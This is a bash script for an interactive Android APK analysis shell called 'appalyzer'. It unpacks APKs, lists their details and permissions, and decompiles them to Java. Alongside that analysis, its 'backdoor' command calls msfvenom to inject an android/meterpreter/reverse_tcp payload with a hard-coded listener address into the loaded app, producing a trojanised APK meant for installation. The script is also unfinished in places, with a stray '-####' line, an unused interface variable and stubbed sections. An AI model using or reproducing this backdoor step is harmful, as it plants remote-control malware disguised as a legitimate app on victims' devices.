#!/bin/bash
red () {
  echo -e '\033[1;31m'"$1"'\033[0m'
}
yellow () {
  echo -e '\033[1;33m'"$1"'\033[0m'
}
get () {
  c=`awk "/##### $1/ {print FNR}" /opt/appalyzer/"$2"/appalyzer.txt`
  ((c++))
  e=""
  while [ "$e" == "" ];do
    line=`cat /opt/appalyzer/"$2"/appalyzer.txt | awk "NR == $c"`
    eline=`echo "$line" | head -c 1`
    if [ "$eline" == "#" ];then
      e="end"
    else
      echo "$line" | egrep --color "\b(dangerous)\b|$"
    fi
    ((c++))
  done
}

##### CHECK SWITCH FOR COLOUR CODING ###
color="yes"
########################################

cwd=`pwd`
jd="/opt/jd-gui"
apk=""
layer="appalyzer"
if [ ! -d /opt/appalyzer ];then
  mkdir /opt/appalyzer
fi
if [ ! -d "$jd" ];then
  echo "[#] Appears this is the dfirst use"
  echo "[#] Setting up environment and installing toolkits"
  echo
  #check internet connection
  if [ "$(ping -c 1 google.com 2>/dev/null | grep -iao 'bytes from')" == "bytes from" ];then
    cd /opt/ && git clone https://github.com/java-decompiler/jd-gui.git && cd jd-gui
    ./gradlew build
    echo 'alias jd-gui="java -jar /opt/jd-gui/build/libs/jd-gui-*.jar"' >> ~/.bash_aliases
    alias jd-gui="java -jar /opt/jd-gui/build/libs/jd-gui-*.jar"
    apt-get update
    apt-get install apktool
    cp perms.com /opt/appalyzer/
    echo "[#] Setup completed"
    sleep 3
    cd "$cwd"
    clear
  else
    yellow "[!] To setup the environment internet connection is required"
    exit
  fi
  echo
  yellow "Opening new terminal due to environment changes... "
  echo
  sleep 2
-#################  gnome-terminal -e "appalyzer" & disown ### THIS WILL BE RELEASE
  gnome-terminal -e "/root/appalyzer" & disown
  exit
fi
echo "Author: m3m1t1m"
echo ""
echo ""
echo " ▄▄▄       ██▓███   ██▓███   ▄▄▄       ██▓   ▓██   ██▓▒███████▒▓█████  ██▀███  "
echo "▒████▄    ▓██░  ██▒▓██░  ██▒▒████▄    ▓██▒    ▒██  ██▒▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒"
echo "▒██  ▀█▄  ▓██░ ██▓▒▓██░ ██▓▒▒██  ▀█▄  ▒██░     ▒██ ██░░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒"
echo "░██▄▄▄▄██ ▒██▄█▓▒ ▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██░     ░ ▐██▓░  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  "
echo " ▓█   ▓██▒▒██▒ ░  ░▒██▒ ░  ░ ▓█   ▓██▒░██████▒ ░ ██▒▓░▒███████▒░▒████▒░██▓ ▒██▒"
echo " ▒▒   ▓▒█░▒▓▒░ ░  ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░  ██▒▒▒ ░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░"
echo "  ▒   ▒▒ ░░▒ ░     ░▒ ░       ▒   ▒▒ ░░ ░ ▒  ░▓██ ░▒░ ░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░"
echo "  ░   ▒   ░░       ░░         ░   ▒     ░ ░   ▒ ▒ ░░  ░ ░ ░ ░ ░   ░     ░░   ░ "
echo "      ░  ░                        ░  ░    ░  ░░ ░       ░ ░       ░  ░   ░     "
echo "                                              ░ ░     ░                        "
echo ""
wd=`pwd`
while [ 1 -lt 2 ];do
  echo -n "$layer> "
  read cmds
  cmd=`echo "$cmds" | awk '{print $1}'`
  if [ "$cmd" == "load" ];then
    if [ "$apk" == "" ];then
      echo
      apk=`echo "$cmds" | awk '{print $2}'`
      if [ -e "$apk" ];then
        cwd=`head -c 1 "$apk"`
        if [ "$cwd" != "/" ];then
          apk="$wd""/""$apk"
        fi
        chk=`file "$apk" | grep -iao 'Zip'`
        chkj=`file "$apk" | grep -iao 'Java'`
        if [ "$chk" == "Zip" ] || [ "$chkj" == "Java" ];then
          apkb=`basename "$apk"`
          if [ -d /opt/appalyzer/"$apkb" ];then
            yellow "[!] Project directory /opt/appalyzer/$apkb already exists"
            yellow "[!] Using existing directory for project workspace"
            red "[!!] If this was not expected exit now to avoid loss of data"
            echo
            apk="$apkb"
            layer="$apk"
            # GET APK DETAILS
          else
            echo "[#] Loading and processing $apkb"
            mkdir /opt/appalyzer/"$apkb" && cp "$apk" /opt/appalyzer/"$apkb"/
            cd /opt/appalyzer/"$apkb"/ && mkdir raw && cp "$apkb" raw/
            apk="$apkb"
            layer="$apk"
            cd raw/ && mkdir .temp && cp "$apk" .temp/ && cd .temp && unzip "$apk" > /dev/null 2>&1
            cd ../ && apktool d -o source "$apk" > /dev/null 2>&1
            cd source
            nm=`grep -iao "@string/app_name\" android:name=[-\"\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'"' '{print $3}'`
            pkg=`grep -iao "package=[-\"\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'"' '{print $2}'`
            ver=`grep -iao "VersionName=[-\"\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'"' '{print $2}'`
            intb=`grep -iao "VersionCode=[-\"\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'"' '{print $2}'`
            perm=`grep -iao "android.permission.[_\.a-zA-Z0-9]\{1,100\}" AndroidManifest.xml | awk -F'.' '{print $3}'`
            ### PROCESS PERMISSIONS BY DANGER LEVEL
            for p in "$perm";do
              # GREP LINE IN DANGER LEVEL FILE AND COLOR
	      grep -a "$p" /opt/appalyzer/perms.com >> /opt/appalyzer/"$apk"/perms.temp
            done
            recfile="/opt/appalyzer/$apk/appalyzer.txt"
	    echo "[#] Successfully loaded $apk"
            echo
            echo -e "##### BASIC\n" >> "$recfile"
  	    echo "app name:	$nm" >> "$recfile"
            echo "package name:   $pkg" >> "$recfile"
            echo "app version:    $ver" >> "$recfile"
            echo "internal build: $intb" >> "$recfile"
            echo -e "\n##### PERMISSIONS\n" >> "$recfile"
            cat /opt/appalyzer/"$apk"/perms.temp >> "$recfile"
	    rm /opt/appalyzer/"$apk"/perms.temp
            echo -e "\n##### END #####" >> "$recfile"
            echo
            cat "$recfile" | egrep --color "\b(dangerous)\b|$"
            echo -e "\n[#] APK loaded successfully, HELP options updated\n"
            wd=`pwd`
            # GET APK DETAILS
          fi
        else
          echo "File does not appear to be an APK"
        fi
      else
        echo "Cannot find APK at path specified"
      fi
    else
      echo "Unload current APK first"
    fi
  fi
  ### DISPLAY REQUESTED PERMISSIONS FOR THE APP
  if [ "$cmd" == "permissions" ];then
    if [ "$apk" == "" ];then
      echo -e "\nNo APK is currently loaded\n"
    else
      echo
      get "PERMISSIONS" "$apk"
      echo
    fi
  fi
  ### DISPLAY INFO
  if [ "$cmd" == "info" ];then
    if [ "$apk" == "" ];then
      echo -e "\nNo APK is currently loaded\n"
    else
      echo
      get "BASIC" "$apk"
      echo
    fi
  fi
  ### BACKDOOR APK FILE
  if [ "$cmd" == "backdoor" ];then
    echo
    echo -n "Which interface do you want to listen on?"
    read intf
    ip="ifconfig $intf | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | grep -m 1 ."
    ### FIND FULL PATH OF APK FILE TO BACKDOOR
    mkdir /opt/appalyzer/"$apk"/backdoors
    msfvenom --platform android -x /opt/appalyzer/"$apk"/"$apk" -p android/meterpreter/reverse_tcp LHOST=192.168.41.45 LPORT=4444 > /opt/appalyzer/"$apk"/backdoors/bkdr.apk
    yellow "[#] APK was backdoored and can be installed using the command bkdrinstall"
    yellow "[#] The raw file can be found at /opt/appalyzer/$apk/backdoors/bkdr.apk"
  fi
  ### INSTALL APK ON DEVICE
  ### UNINSTALL APK FROM DEVICE
  ### ADB SHELL
  ### VIEW JAVA SOURCE CODE OF THE APP
  if [ "$cmd" == "decompile" ];then
    jc1="/opt/appalyzer/"
    jc2="/java/classes.jar"
    ### NEEDS MORE WORK FOR FULL DECOMPILATION
    if [ ! -f "$jc1"$apk"$jc2" ];then
      mkdir /opt/appalyzer/"$apk"/raw/java
      d2j-dex2jar /opt/appalyzer/"$apk"/raw/.temp/classes.dex -o /opt/appalyzer/"$apk"/java/classes.jar
      java -jar /opt/jd-gui/build/libs/jd-gui-*.jar /opt/appalyzer/"$apk"/java/classes.jar
    else
      java -jar /opt/jd-gui/build/libs/jd-gui-*.jar /opt/appalyzer/"$apk"/java/classes.jar
    fi
    ##########################################
  fi
  ### UNLOAD CURRENTLY LOADED APK FILE
  if [ "$cmd" == "unload" ];then
    if [ "$apk" == "" ];then
      echo "There isn't a loaded APK."
    else
      apk=""
      layer="appalyzer"
    fi
  fi
  ### LIST FILES LOCALLY
  if [ "$cmd" == "ls" ];then
    echo
    ls -la
    echo
  fi
  ### CHANGE DIR LOCALLY
  if [ "$cmd" == "cd" ];then
    dir=`echo "$cmds" | awk '{print $2}'`
    cd "$dir"
    wd=`pwd`
  fi
  ### EXIT APPALYZER
  if [ "$cmd" == "exit" ];then
    exit
  fi
  if [ "$cmd" == "quit" ];then
    exit
  fi
  if [ "$cmd" == "help" ];then
    if [ "$apk" = "" ];then ### NO APK IS LOADED
      echo -e "\n\033[1;33mload <apk file>\033[0m: loads apk for analysis\n\033[1;33mls\033[0m: list local files\n\033[1;33mcd\033[0m: change local directory"
      echo -e "\033[1;33mhelp\033[0m: displays this screen\n\033[1;33mquit\033[0m: exit appalyzer\n\033[1;33mexit\033[0m: exit appalyzer\n"
    else ### lOADED APK
      echo -e "\n\033[1;33munload\033[0m: unloads apk from analysis framework\n\033[1;33mpermissions\033[0m: display permissions for loaded APK\n\033[1;33mdecompile\033[0m: decompiles apk into java source code"
      echo -e "\033[1;33minfo\033[0m: displays apk information\n\033[1;33mls\033[0m: list local files\n\033[1;33mcd\033[0m: change local directory"
      echo -e "\033[1;33mhelp\033[0m: displays this screen\n\033[1;33mquit\033[0m: exit appalyzer\n\033[1;33mexit\033[0m: exit appalyzer\n"
    fi
  fi
done
